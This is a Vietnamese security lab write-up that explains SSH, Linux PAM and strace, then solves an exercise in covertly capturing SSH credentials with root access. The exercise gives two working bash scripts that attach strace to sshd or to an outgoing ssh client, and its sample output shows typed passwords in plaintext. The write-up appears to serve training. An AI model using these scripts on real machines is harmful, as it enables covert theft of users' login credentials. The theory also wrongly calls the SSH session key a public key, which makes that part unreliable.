# Challenge 3: Lập trình SSH Logger

## 1. Lý thuyết

- OpenSSH là bộ công cụ mã nguồn mở, được sử dụng để mã hóa thông tin trao đổi giữa các host với nhau sử dụng SSH. Bộ công cụ OpenSSH gồm:
  - Remote Operation: ssh, scp và sftp
  - Key Management: ssh-add, ssh-keysign, ssh-keyscan và ssh-keygen
  - Các dịch vụ khác: sshd, sftp-server và ssh-agent
- **sshd** (OpenSSH Daemon):
  - Là chương trình dạng *daemon*
  - Lắng nghe các kết nối từ máy khách đến máy chủ tại cổng 22
  - Thường khởi động cùng hệ thống với quyền root
  - **sshd** tạo một *daemon* mới cho mỗi kết nối tới máy chủ, các *daemon* này xử việc trao đổi khóa, mã hóa, xác thực, thực thi mã và trao đổi dữ liệu
- Quá trình SSH bao gồm 3 giai đoạn: **Verification of the server by the client**, **Generation of a session key to encrypt all the communication** và **Authentication of the client**
  - **Verification of server**: Server lắng nghe kết nối SSH tại cổng 22. Khi client khởi tạo một kết nối tới cổng này, có 2 trường hợp:
    - Nếu client kết nối đến server lần đầu tiên, server sẽ yêu cầu client xác minh thủ công **public key** của server. **Public key** này có thể được tìm thấy bằng lệnh `ssh-keyscan`. Sau khi **public key** được xác minh, client sẽ lưu server vào tệp tin `./.ssh/known_hosts`. Tệp tin `known_hosts` lưu thông tin các server mà client đã xác minh.
    - Nếu client đã từng kết nối đến server rồi thì thông tin của server sẽ khớp với bản ghi trong file `known_hosts`
  - **Generation of Session Key**: Sau khi đã xác minh, 2 bên sẽ thỏa thuận khóa phiên - dùng để mã hóa toàn bộ giao tiếp giữa 2 bên - sử dụng thuật toán trao đổi khóa **Diffie-Hellman**. Khóa phiên được tạo ra là khóa công khai - dùng chung cho cả quá trình giải mã và mã hóa
  - **Authentication of the Client**: Giai đoạn cuối cùng là xác thực client, có nhiều phương pháp xác thực như **Host-based Authentication** hay **Public key Authentication**. Quá trình **Public key Authentication** sử dụng cặp khóa dưới dạng mã hóa bất đối xứng, **private key** dùng để giải mã dữ liệu và thường được người dùng giữ, còn **public key** dùng để mã hóa dữ liệu và server giữ. Hoạt động diễn ra như sau:
    - Client sẽ gửi thông tin user được sử dụng để đăng nhập vào Server. Server sẽ đi hỏi OS PAM xem có user này trong hệ thống không, nếu có thì tiếp tục tiến trình kiểm tra cặp key
    - Client gửi một thông tin ID của cặp key được sử dụng để chứng thực đến server.
    - Server xem tệp `authorized_keys` để kiểm tra account mà user đang log in vào dựa vào key ID
    - Nếu có 1 **public key** trùng khớp với ID được tìm thấy trong file thì server sẽ tạo một chuỗi **string+number (challenge)** và sử dụng **public key** để mã hóa chuỗi đó thành một thông điệp và gửi nso đến cho client.
    - Nếu client thật sự sở hữu **private key** tương ứng thì sẽ có khả năng giải mã thông điệp để khôi phục lại chuỗi kí tự ban đầu
    - Sau khi giải mã thành công thì chuỗi kí tự đó được kết hợp với **Session key** được tạo ra ở giai đoạn 2 và tính toán giá trị MD5 hash ra 1 chuỗi mới để gửi ngược về phía server
    - Server sử dụng **Session key** được tạo ra ở giai đoạn 2 và chuỗi kí tự ban đầu, tính toán giá trị MD5 hash sau đó so sánh với MD5 hash mà client gửi. Nếu trùng nhau thì client sẽ được phép truy cập server.
- **Linux PAM** (Pluggable Authentication Modules): Là hệ thống các thư viện xử lý quá trình xác thức của ứng dụng (hoặc dịch vụ) trên hệ thống. PAM cung cấp cho các **privilege granting programs** (ví dụ login, su, ...) một API để thực hiện quá trình xác thực. Thay vì hỏi người dùng username và password. PAM chịu trách nhiệm xác thực các tệp đang được chạy. Điều này cho phép các nhà phát triển viết các ứng dụng yêu cầu xác thực độc lập với xác thực hệ thống.
  - Linux PAM tách quá trình xác thực thành 4 nhóm quản lý độc lập: **account** management, **auth**entication management, **password** management và **session** management.
    - **Auth**: Là module chịu trách nhiệm cho mục đích xác thực. Nó xác minh mật khẩu
    - **Account**: Sau khi người dùng đã xác thực bằng thông tin chính xác, phần account sẽ kiểm tra tính hợp lệ của tài khoản như hạn chế dưang nhập hoặc thời gian đăng nhập, ...
    - **Password**: Được sử dụng để thay đổi mật khẩu
    - **Session**: Quản lý các session, chứa tài khoản hoạt động của người dùng, tạo hộp thư, tạo thư mục chính của người dùng, ...
  - Cách hoạt động của PAM:
    - Người dùng chạy một ứng dụng để truy cập vào dịch vụ mong muốn (ví dụ: `login`)
    - PAM library được gọi để thực hiện nhiệm vụ xác thực
    - PAM library sẽ dựa vào file cấu hình của chương trình đó trong `/etc/pam.d` (ví dụ: `/etc/pam.d/login`) xác định loại xác thực nào được yêu cầu cho chương trình trên. Trong trường hợp không có file cấu hình thì file `/etc/pam.d/other` sẽ được sử dụng
    - PAM library sẽ load các module yêu cầu cho xác thực trên
    - Các module này sẽ tạo một kiên kết tới các hàm chuyển đổi (conversation functions) trên chương trình
    - Các hàm này dựa vào các modules mà đưa ra các yêu cầu với người dùng (ví dụ: yêu cầu người dùng nhập mật khẩu)
    - Người dùng nhập thông tin vào theo yêu cầu
    - Sau khi quá trình xác thực kết thúc, chương trình này sẽ dựa vào kết quả mà đáp ứng yêu cầu người dùng (ví dụ: cho phép login vào hệ thống) hay thông báo thất bại với người dùng
- **strace** là công cụ chẩn đoán, hướng dẫn và debug. Nó chặn bắt và ghi lại các system calls được gọi bởi tiến trình và các signal mà tiến trình đó nhận được.
- **strace** sử dụng **ptrace** (process trace) - một system call cho phép tiến trình cha theo dõi và điều khiển tiến trình con. **ptrace** sử dụng một số cấu trúc dữ liệu nội bộ của Linux để thiết lập mối quan hệ giữa tiến trình cha *(tracer)* và tiến trình con *(traced process)*. Bất cứ khi nào một system call được gọi bởi *traced process*, *tracer* sẽ được thông báo và *traced process* sẽ tạm thời bị dừng lại. Tại thời điểm này, **strace** sẽ xử lý thông tin về system call được gọi, sau đó trả lại quyền điều khiển cho *traced process*. **ptrace** hoạt động như một thành phần trung gian giữa tiến trình đang chạy và **strace**

## 2. Bài tập thực hành

Mô tả: Trường hợp đang có quyền root để truy cập vào 1 máy tính linux. Xây dựng cơ chế/kỹ thuật/chương trình để lấy được username, password ssh trong 2 trường hợp sau mà không thay đổi luồng hoạt động bình thường (khuyến khích làm theo nhiều cách)

1. Một user tiến hành truy cập vào máy tính đó thông qua ssh

   - Source code:

     ```shell
     #!/bin/bash
     
     sshd_pid=$(ps aux | grep -v grep | grep -i sshd | grep "listen" | sed -e 's/  */ /g' | cut -d" " -f 2)
     
     sudo strace -t -e read,write,openat -f -p $sshd_pid 2>&1 | grep --line-buffered -F -e 'write(5, "\0\0\0\' -e 'read(6, "\f\0\0\' -e '.profile'  
     ```

   - Chạy script: `source sshd_logger.sh`

   - Output:
   
     ```bash
     linhtd99@ubuntu:~/Desktop/C3$ source sshd_logger.sh
     
     [pid  6322] 21:46:21 write(5, "\0\0\0\1\0\0\0 \344.\34f#x\311}\220j(\355\261^uU!G\v\372\312$l{"..., 67) = 67
     [pid  6322] 21:46:21 write(5, "\0\0\0\t\10", 5) = 5
     [pid  6322] 21:46:21 write(5, "\0\0\0\4test", 8) = 8
     [pid  6322] 21:46:21 write(5, "\0\0\0\1d", 5) = 5
     [pid  6322] 21:46:21 write(5, "\0\0\0\33\4", 5) = 5
     [pid  6322] 21:46:21 write(5, "\0\0\0\16ssh-connection\0\0\0\0\0\0\0\0", 26) = 26
     [pid  6322] 21:46:30 write(5, "\0\0\0\23\f", 5) = 5
     [pid  6322] 21:46:30 write(5, "\0\0\0\16wrong_password", 18) = 18
     [pid  6321] 21:46:30 read(6, "\f\0\0\0\16wrong_password", 19) = 19
     [pid  6322] 21:46:37 write(5, "\0\0\0\23\f", 5) = 5
     [pid  6322] 21:46:37 write(5, "\0\0\0\16BrUt3_f0rC3_m3", 18 <unfinished ...>
     [pid  6321] 21:46:37 read(6, "\f\0\0\0\16BrUt3_f0rC3_m3", 19) = 19
     [pid  6322] 21:46:37 write(5, "\0\0\0\1f", 5) = 5
     [pid  6470] 21:46:38 write(5, "\0\0\0\1\34", 5) = 5
     [pid  6471] 21:46:38 openat(AT_FDCWD, "/home/test/.profile", O_RDONLY) = 3
     ```
  
   - Mô tả ý tưởng:

     - Đầu tiên cần phải lấy được **PID** của `sshd`
     - Sau đó sử dụng `strace` để ghi lại các **system call** của `sshd`
     - `write(5, "\0\0\0\4test", 8) = 8` :arrow_forward: **username = test**
     - `openat(AT_FDCWD, "/home/test/.profile", O_RDONLY) = 3` :arrow_forward: **Thông báo xác thực thành công**
     - Sau khi người dùng nhập đúng password thì mới có thông báo xác thực hành công, vậy nên password đúng là password ngay trước thông báo xác thực thành công
     - `read(6, "\f\0\0\0\16wrong_password", 19) = 19` :arrow_forward: **~~password sai = wrong_password~~**
     - `read(6, "\f\0\0\0\16BrUt3_f0rC3_m3", 19) = 19` :arrow_forward: **password đúng = BrUt3_f0rC3_m3**

2. Một người dùng đứng trên máy tính đó ssh đi một máy tính khác

   - Source code:

     ``` shell
     #!/bin/bash
     
     ssh_pid=$(ps aux | grep -v grep | grep -i "ssh" | grep -i "pts" | sed -e 's/  */ /g' | cut -d" " -f 2)
     
     while [ ! $ssh_pid ];
     do
        ssh_pid=$(ps aux | grep -v grep | grep -i "ssh" | grep -i "pts" | sed -e 's/  */ /g' | cut -d" " -f 2)
     done
     
     hostname=$(sudo ps -p $ssh_pid -o args --no-headers | cut -d " " -f 2)
     echo -e "Connecting to: $hostname\n"
     echo "Keylogging ..."
     sudo strace -t -p $ssh_pid -e read,openat  2>&1 | grep --line-buffered -w -e 'openat' -e '= 1'
     ```

   - Chạy script: `source ssh_logger.sh`

   - Output: 
   
     ```bash
     linhtd99@ubuntu:~/Desktop/C3$ source ssh_logger.sh
     
     Connecting to: test@127.0.0.1
     
     Keylogging ...
     21:44:19 read(4, "w", 1)                = 1
     21:44:26 read(4, "r", 1)                = 1
     21:44:26 read(4, "o", 1)                = 1
     21:44:26 read(4, "n", 1)                = 1
     21:44:26 read(4, "g", 1)                = 1
     21:44:26 read(4, "_", 1)                = 1
     21:44:26 read(4, "p", 1)                = 1
     21:44:26 read(4, "a", 1)                = 1
     21:44:26 read(4, "s", 1)                = 1
     21:44:26 read(4, "s", 1)                = 1
     21:44:26 read(4, "w", 1)                = 1
     21:44:26 read(4, "o", 1)                = 1
     21:44:26 read(4, "r", 1)                = 1
     21:44:26 read(4, "d", 1)                = 1
     21:44:26 read(4, "\n", 1)               = 1
     21:44:28 openat(AT_FDCWD, "/dev/tty", O_RDWR) = 4
     21:44:28 openat(AT_FDCWD, "/dev/tty", O_RDWR) = 4
     21:44:28 read(4, "B", 1)                = 1
     21:44:32 read(4, "r", 1)                = 1
     21:44:32 read(4, "U", 1)                = 1
     21:44:32 read(4, "t", 1)                = 1
     21:44:32 read(4, "3", 1)                = 1
     21:44:32 read(4, "_", 1)                = 1
     21:44:32 read(4, "f", 1)                = 1
     21:44:32 read(4, "0", 1)                = 1
     21:44:32 read(4, "r", 1)                = 1
     21:44:32 read(4, "C", 1)                = 1
     21:44:32 read(4, "3", 1)                = 1
     21:44:32 read(4, "_", 1)                = 1
     21:44:32 read(4, "m", 1)                = 1
     21:44:32 read(4, "3", 1)                = 1
     21:44:32 read(4, "\n", 1)               = 1
     21:44:32 openat(AT_FDCWD, "/dev/null", O_WRONLY) = 7
     ```

   - Mô tả ý tưởng

     - Vòng **while** sẽ liên tục kiểm tra xem người dùng có thực hiện ssh đến máy khác không, nếu người dùng thực hiện ssh đến máy khác thì sẽ lấy được **PID** và **hostname** tương ứng

     - Ví dụ khi người dùng tiến hành `ssh test@127.0.0.1`, sử dụng `grep` kết hợp `ps` sẽ ra kết quả như sau

       ```bash
       linhtd99@ubuntu:~/Desktop$ ps aux | grep "ssh" | grep "pts" | grep -v grep
       
       linhtd99    2021  0.0  0.1  23244  6156 pts/1    S+   21:27   0:00 ssh test@127.0.0.1
       ```

     - **PID** cần strace là **2021**

     - Command = `ssh test@127.0.0.1` :arrow_forward: **hostname = test@127.0.0.1**. 

     - `openat(AT_FDCWD, "/dev/null", O_WRONLY) = 7` :arrow_forward: **Thông báo xác thực thành công**

     - Kí tự `\n` là endline, mỗi một lần nhập password được ngăn cách bởi `\n`. Vậy trong trường hợp này có 2 lần nhập password là **wrong_password** và **BrUt3_f0rC3_m3**

     - Tương tự như bài thực hành trên, sau khi người dùng nhập đúng password thì mới có thông báo xác thực thành công, vậy nên password đúng là password ngay trên thông báo xác thực thành công 

     - :arrow_forward: **~~password sai = wrong_password~~**

     - :arrow_forward: **password đúng = BrUt3_f0rC3_m3**

